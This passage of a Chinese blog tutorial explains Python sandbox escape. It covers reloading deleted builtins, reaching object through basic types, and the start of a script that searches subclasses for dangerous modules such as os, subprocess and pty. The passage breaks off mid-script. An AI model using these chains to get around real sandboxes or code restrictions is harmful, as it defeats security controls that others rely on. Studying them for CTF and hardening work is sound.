title="重新导入"></a>重新导入</h2><p>Python将一些经常用到的函数放在了<code>内建模块</code>中，这些函数无需导入即可使用（比如<code>eval</code>、<code>open</code>），这个内建模块在Python2中叫作<code>__builtin__</code>、在Python3中叫作<code>builtins</code>，这两个都需要导入才可以引用，但可以通过<code>__builtins__</code>来间接引用而无需导入（有一点区别，但问题不大）。</p><p>一些环境出于安全考虑会删掉<code>内建模块</code>中的危险方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;execfile&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;getattr&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;input&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这时可以尝试重新导入<code>内建模块</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">imp.reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">reload(__builtins__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可用作首次导入</span></span><br></pre></td></tr></table></figure><p>但是Python2的<code>reload</code>也是内建模块，可以通过<code>del __builtins__.reload</code>删掉。</p><h2 id="构造逃逸链"><a href="#构造逃逸链" class="headerlink" title="构造逃逸链"></a>构造逃逸链</h2><p>对于<code>a</code>模块嵌套导入的<code>b</code>模块中导入的<code>xxx</code>模块，可以通过<code>a.b.xxx</code>的方式来引用。如果标准库中嵌套导入了危险模块则会成为一个潜在风险，但是标准库也是需要先导入才能用的，如何才能打破僵局让潜在风险可被利用呢？</p><p>在Python3中所有的类都默认继承自<code>object</code>类、继承<code>object</code>的全部方法，在Python2中类默认为<code>classobj</code>，只有<code>[&#39;__doc__&#39;, &#39;__module__&#39;]</code>两个方法，除非显式声明继承自<code>object</code>类。</p><p>思路一：如果<code>object</code>的某个派生类中存在危险方法，就可以直接拿来用</p><p>思路二：如果<code>object</code>的某个派生类导入了危险模块，就可以链式调用危险方法</p><p>思路三：如果<code>object</code>的某个派生类由于导入了某些标准库模块，从而间接导入了危险模块的危险方法，也可以通过链式调用</p><p>思路四：基本类型的某些方法属于特殊方法，可以通过链式调用</p><h3 id="获取object类"><a href="#获取object类" class="headerlink" title="获取object类"></a>获取object类</h3><p>Python建议类的protected类型、private类型及内部变量分别以<code>_xxx</code>、<code>__yyy</code>、<code>__zzz__</code>的形式命名，但这仅是一种代码风格规范，并未在语言层面作任何限制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">object</span><br><span class="line"></span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下标可以用负数来倒数</span></span><br></pre></td></tr></table></figure><h3 id="遍历派生类"><a href="#遍历派生类" class="headerlink" title="遍历派生类"></a>遍历派生类</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/python/cpython/tree/2.7/Lib</span></span><br><span class="line"><span class="comment"># ls -l /usr/lib/python2.7 | awk &#x27;&#123;print$9&#125;&#x27; | grep -v &#x27;.pyc\|this\|antigravity&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2标准库模块</span></span><br><span class="line">modules2 = [<span class="string">&#x27;_abcoll&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;anydbm&#x27;</span>, <span class="string">&#x27;argparse.egg-info&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;audiodev&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;BaseHTTPServer&#x27;</span>, <span class="string">&#x27;Bastion&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;compiler&#x27;</span>, <span class="string">&#x27;ConfigParser&#x27;</span>, <span class="string">&#x27;config-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;cookielib&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copy_reg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dbhash&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fpformat&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;hotshot&#x27;</span>, <span class="string">&#x27;htmlentitydefs&#x27;</span>, <span class="string">&#x27;htmllib&#x27;</span>, <span class="string">&#x27;HTMLParser&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;ihooks&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;lib-tk&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;_LWPCookieJar&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;macurl2path&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;markupbase&#x27;</span>, <span class="string">&#x27;md5&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;MimeWriter&#x27;</span>, <span class="string">&#x27;mimify&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="string">&#x27;multifile&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;mutex&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os2emxpath&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pdb.doc&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plat-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;Queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;rfc822&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;robotparser&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;sets&#x27;</span>, <span class="string">&#x27;sgmllib&#x27;</span>, <span class="string">&#x27;sha&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;sre&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;StringIO&#x27;</span>, <span class="string">&#x27;stringold&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunaudio&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;toaiff&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urlparse&#x27;</span>, <span class="string">&#x27;UserDict&#x27;</span>, <span class="string">&#x27;UserList&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;UserString&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;wsgiref.egg-info&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmllib&#x27;</span>, <span class="string">&#x27;xmlrpclib&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3标准库模块</span></span><br><span class="line">modules3 = [<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncio&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;_bootlocale&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;_collections_abc&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;_compat_pickle&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;_compression&#x27;</span>, <span class="string">&#x27;concurrent&#x27;</span>, <span class="string">&#x27;config-3.8-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;configparser&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;contextvars&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copyreg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dataclasses&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;dbm&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;_dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;enum&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;ipaddress&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;lzma&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;_markupbase&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pathlib&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;_py_abc&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;_pydecimal&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;reprlib&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;secrets&#x27;</span>, <span class="string">&#x27;selectors&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;_sitebuiltins&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;socketserver&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;statistics&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata__linux_x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;_sysconfigdata__x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;tkinter&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;tracemalloc&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;typing&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;venv&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmlrpc&#x27;</span>, <span class="string">&#x27;zipapp&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险模块</span></span><br><span class="line">methods = [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;import_module&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;spawn&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;types&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型</span></span><br><span class="line">types = [<span class="string">&#x27;&#x27;</span>, [], (), &#123;&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># object的派生类</span></span><br><span class="line">subclasses = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险标准库模块</span></span><br><span class="line">risk_modules = 